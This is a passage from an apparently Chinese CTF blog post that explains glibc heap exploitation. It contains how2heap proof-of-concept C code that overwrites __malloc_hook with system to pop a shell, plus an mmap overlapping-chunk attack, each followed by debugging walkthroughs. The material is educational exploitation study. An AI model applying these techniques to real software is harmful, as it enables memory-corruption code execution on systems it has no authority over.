real attack, the first 12 bits are static (per version). </span></span><br><span class="line"><span class="comment">	But, after that, the next 12 bits must be brute forced. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	/// <span class="doctag">NOTE:</span> For the sake of example, we will be setting these values, instead of brute forcing them. \\\</span></span><br><span class="line"><span class="comment">	*/</span> </span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Step 3: Set __malloc_hook to system/one_gadget\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\</span></span><br><span class="line"><span class="string">we can use a relative overwrite to point this to system or a one_gadget.\n\</span></span><br><span class="line"><span class="string">Note: In a real attack, this would be where the last 8 bits of brute forcing\n\</span></span><br><span class="line"><span class="string">comes from.\n&quot;</span>);</span><br><span class="line">	malloc_hook_chunk[<span class="number">19</span>] = system_addr &amp; <span class="number">0xff</span>; <span class="comment">// The first 12 bits are static (per version).</span></span><br><span class="line"></span><br><span class="line">	malloc_hook_chunk[<span class="number">20</span>] = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last 4 bits of this must be brute forced (done previously already).</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">21</span>] = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;  <span class="comment">// The last byte is the remaining 8 bits that must be brute forced.</span></span><br><span class="line">	malloc_hook_chunk[<span class="number">22</span>] = (system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>; <span class="comment">// If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Trigger the malloc call for code execution via the system call being ran from the __malloc_hook.</span></span><br><span class="line">	<span class="comment">// In a real example, you would probably want to use a one_gadget. </span></span><br><span class="line">	<span class="comment">// But, to keep things portable, we will just use system and add a pointer to /bin/sh as the parameter</span></span><br><span class="line">	<span class="comment">// Although this is kind of cheating (the binary is PIE), if the binary was not PIE having a pointer into the .bss section would work without a single leak. </span></span><br><span class="line">	<span class="comment">// To get the system address (eariler on for consistency), the binary must be PIE though. So, the address is put in here.</span></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Pop Shell!&quot;</span>);</span><br><span class="line">	<span class="built_in">malloc</span>((<span class="type">long</span> <span class="type">long</span>)shell);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-16"><a href="#调试-16" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204026160.png"
                      alt="image-20231013204026160"
                ></p>
<p>部署如上 <code>chunk</code>，从上到下分别为 <code>fastbin_victim</code> ，<code>obstruct</code>，<code>main_arena_use</code>，<code>relative_offset_heap</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204454716.png"
                      alt="image-20231013204454716"
                ></p>
<p>将 <code>main_arena_use</code> 放进 <code>unsorted_bin</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204656108.png"
                      alt="image-20231013204656108"
                ></p>
<p>再次申请 <code>0x70</code> 大小的 <code>chunk: fake_libc_chunk</code> ，拆分 <code>main_arena_use</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205315619.png"
                      alt="image-20231013205315619"
                ></p>
<p>利用 <code>fake_libc_chunk</code> 中保存的 <code>libc</code> 地址和固定偏移 <code>glibc_2.23为0xe8（每个版本基本都不同）</code> 计算出 <code>__malloc_hook</code> 地址。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205510025.png"
                      alt="image-20231013205510025"
                ></p>
<p>依次释放 <code>relative_offset_heap</code>，<code>fastbin_victim</code> 。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210049926.png"
                      alt="image-20231013210049926"
                ></p>
<p>将 <code>fastbin_victim</code> 的 <code>fd</code> 指针的末尾两位改为 <code>0</code>，那么将会把 <code>fake_libc_chunk</code> 链接进 <code>fastbinY[5](0x70)</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210254989.png"
                      alt="image-20231013210254989"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210849688.png"
                      alt="image-20231013210849688"
                ></p>
<p><code>glibc_2.23</code> 版本在 <code>__malloc_hook-0x23</code> 处存在 <code>0x7f</code> 大小的 <code>fake_fast</code> ，我们将 <code>fake_libc_chunk</code> 的 <code>fd</code> 指针指向 <code>fake_fast_malloc_hook</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211147427.png"
                      alt="image-20231013211147427"
                ></p>
<p>申请 <code>3</code> 次 <code>0x70</code> 大小的 <code>chunk</code>，可以将 <code>fake_fast_malloc_hook</code> 申请出来。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211909572.png"
                      alt="image-20231013211909572"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211951560.png"
                      alt="image-20231013211951560"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212024266.png"
                      alt="image-20231013212024266"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212227267.png"
                      alt="image-20231013212227267"
                ></p>
<p>因为 <code>__malloc_hook</code> 和 <code>system</code> 的地址差异较大，需要更改的字节较多，所以我们通过 <code>unsorted_bin attack(前文有介绍，不再赘述)</code> 将其改为 <code>main_arena + 0x58</code> 处的地址，再将其改为 <code>system</code> 地址即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212506159.png"
                      alt="image-20231013212506159"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212722616.png"
                      alt="image-20231013212722616"
                ></p>
<p>从 <code>19(0x13，也就是 0x23-0x8_fd-0x8_bk)</code> 处开始按字节写入后 <code>system</code> 几位地址 ，再去 <code>&quot;malloc(&quot;/bin/sh\x00&quot;)&quot;</code> 即可 <code>getshell</code> 。</p>
<h2 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Technique should work on all versions of GLibC</span></span><br><span class="line"><span class="comment">Compile: `gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g`</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC written by POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	A primer on Mmap chunks in GLibC</span></span><br><span class="line"><span class="comment">	==================================</span></span><br><span class="line"><span class="comment">	In GLibC, there is a point where an allocation is so large that malloc</span></span><br><span class="line"><span class="comment">	decides that we need a seperate section of memory for it, instead </span></span><br><span class="line"><span class="comment">	of allocating it on the normal heap. This is determined by the mmap_threshold var.</span></span><br><span class="line"><span class="comment">	Instead of the normal logic for getting a chunk, the system call *Mmap* is </span></span><br><span class="line"><span class="comment">	used. This allocates a section of virtual memory and gives it back to the user. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Similarly, the freeing process is going to be different. Instead </span></span><br><span class="line"><span class="comment">	of a free chunk being given back to a bin or to the rest of the heap,</span></span><br><span class="line"><span class="comment">	another syscall is used: *Munmap*. This takes in a pointer of a previously </span></span><br><span class="line"><span class="comment">	allocated Mmap chunk and releases it back to the kernel. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have special bit set on the size metadata: the second bit. If this </span></span><br><span class="line"><span class="comment">	bit is set, then the chunk was allocated as an Mmap chunk. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Mmap chunks have a prev_size and a size. The *size* represents the current </span></span><br><span class="line"><span class="comment">	size of the chunk. The *prev_size* of a chunk represents the left over space</span></span><br><span class="line"><span class="comment">	from the size of the Mmap chunk (not the chunks directly belows size). </span></span><br><span class="line"><span class="comment">	However, the fd and bk pointers are not used, as Mmap chunks do not go back </span></span><br><span class="line"><span class="comment">	into bins, as most heap chunks in GLibC Malloc do. Upon freeing, the size of </span></span><br><span class="line"><span class="comment">	the chunk must be page-aligned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The POC below is essentially an overlapping chunk attack but on mmap chunks. </span></span><br><span class="line"><span class="comment">	This is very similar to https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c. </span></span><br><span class="line"><span class="comment">	The main difference is that mmapped chunks have special properties and are </span></span><br><span class="line"><span class="comment">	handled in different ways, creating different attack scenarios than normal </span></span><br><span class="line"><span class="comment">	overlapping chunk attacks. There are other things that can be done, </span></span><br><span class="line"><span class="comment">	such as munmapping system libraries, the heap itself and other things.</span></span><br><span class="line"><span class="comment">	This is meant to be a simple proof of concept to demonstrate the general </span></span><br><span class="line"><span class="comment">	way to perform an attack on an mmap chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	For more information on mmap chunks in GLibC, read this post: </span></span><br><span class="line"><span class="comment">	http://tukan.farm/2016/07/27/munmap-madness/</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span>* ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;of memory, instead of being put onto the normal heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=======================================================\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;</span>);</span><br><span class="line">		</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* top_ptr = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The first mmap chunk goes directly above LibC: %p\n&quot;</span>,top_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After this, all chunks are allocated downwards in memory towards the heap.</span></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_2 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The second mmap chunk goes below LibC: %p\n&quot;</span>, mmap_chunk_2);</span><br><span class="line"></span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* mmap_chunk_3 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;</span>, mmap_chunk_3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nCurrent System Memory Layout \n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;================================================\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;running program\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;heap\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;third mmap chunk\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;second mmap chunk\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;LibC\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;....\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;ld\n&quot;</span> \</span><br><span class="line">			<span class="string">&quot;first mmap chunk\n&quot;</span></span><br><span class="line">			<span class="string">&quot;===============================================\n\n&quot;</span> \</span><br><span class="line">			);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size of third mmap chunk: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.</span></span><br><span class="line">	<span class="comment">// Additionally, this same attack can be used with the prev_size instead of the size.</span></span><br><span class="line">	mmap_chunk_3[<span class="number">-1</span>] = (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="number">-1</span>]) + (<span class="number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="number">-1</span>]) | <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New size of third mmap chunk: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="number">-1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This next call to free is actually just going to call munmap on the pointer we are passing it.</span></span><br><span class="line"><span class="comment">	The source code for this can be found at https://elixir.bootlin.com/glibc/glibc-2.26/source/malloc/malloc.c#L2845</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	With normal frees the data is still writable and readable (which creates a use after free on </span></span><br><span class="line"><span class="comment">	the chunk). However, when a chunk is munmapped, the memory is given back to the kernel. If this</span></span><br><span class="line"><span class="comment">	data is read or written to, the program crashes.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Because of this added restriction, the main goal is to get the memory back from the system</span></span><br><span class="line"><span class="comment">	to have two pointers assigned to the same location.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">// Munmaps both the second and third pointers</span></span><br><span class="line">	<span class="built_in">free</span>(mmap_chunk_3); </span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	Would crash, if on the following:</span></span><br><span class="line"><span class="comment">	mmap_chunk_2[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="comment">	This is because the memory would not be allocated to the current program.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Allocate a very large chunk with malloc. This needs to be larger than </span></span><br><span class="line"><span class="comment">	the previously freed chunk because the mmapthreshold has increased to 0x202000.</span></span><br><span class="line"><span class="comment">	If the allocation is not larger than the size of the largest freed mmap </span></span><br><span class="line"><span class="comment">	chunk then the allocation will happen in the normal section of heap memory.</span></span><br><span class="line"><span class="comment">	*/</span>	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This should overlap over the previously munmapped/freed chunks\n&quot;</span>);</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span>* overlapping_chunk = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr: %p\n&quot;</span>, overlapping_chunk);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="number">-1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Gets the distance between the two pointers.</span></span><br><span class="line">	<span class="type">int</span> distance = mmap_chunk_2 - overlapping_chunk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;</span>, distance);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Set the value of the overlapped chunk.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting the value of the overlapped chunk\n&quot;</span>);</span><br><span class="line">	overlapping_chunk[distance] = <span class="number">0x1122334455667788</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Show that the pointer has been written to.</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Second chunk value (after write): 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Overlapped chunk value: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">assert</span>(mmap_chunk_2[<span class="number">0</span>] == overlapping_chunk[distance]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-17"><a href="#调试-17" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014110953593.png"
                      alt="image-20231014110953593"
                ></p>
<p>首先申请三个 <code>0x100000</code> 大小的 <code>mmap_chunk</code>，分别为 <code>top_ptr</code>，<code>mmap_chunk_2</code>，<code>mmap_chunk_3</code>，第一个 <code>top_ptr</code> 位于 <code>libc.so</code> 上方。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111020031.png"
                      alt="image-20231014111020031"
                ></p>
<p>接下来将 <code>mmap_chunk_3</code> 的 <code>size</code> 改为 <code>202002</code>，因为 <code>mmap_chunk_3</code> 位于 <code>mmap_chunk_2</code> 低地址处，所以 <code>mmap_chunk_3</code> 现在的 <code>size</code> 大小包含了 <code>mmap_chunk_2</code> ，与 <code>2</code> 取与运算是为了将 <code>IS_MMAP</code> 位置为 <code>1</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111503915.png"
                      alt="image-20231014111503915"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111605033.png"
                      alt="image-20231014111605033"
                ></p>
<p>接下来 <code>free(mmap_chunk_3)</code> 。再次申请 <code>0x300000</code> 大小的 <code>overlapping_chunk</code>，<code>mmap_chunk_2</code> 被包含在了 <code>overlapping_chunk</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111828047.png"
                      alt="image-20231014111828047"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111851907.png"
                      alt="image-20231014111851907"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111909499.png"
                      alt="image-20231014111909499"
                ></p>
<p>我们可以通过 <code>overlapping_chunk</code> 去修改 <code>mmap_chunk_2</code> 的内容。</p>
<h2 id="house-of-gods"><a href="#house-of-gods" class="headerlink" title="house_of_gods"></a>house_of_gods</h2><p><code>glibc &lt; 2.27</code>，这是一个比较有趣的利用手法。</p>
<h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 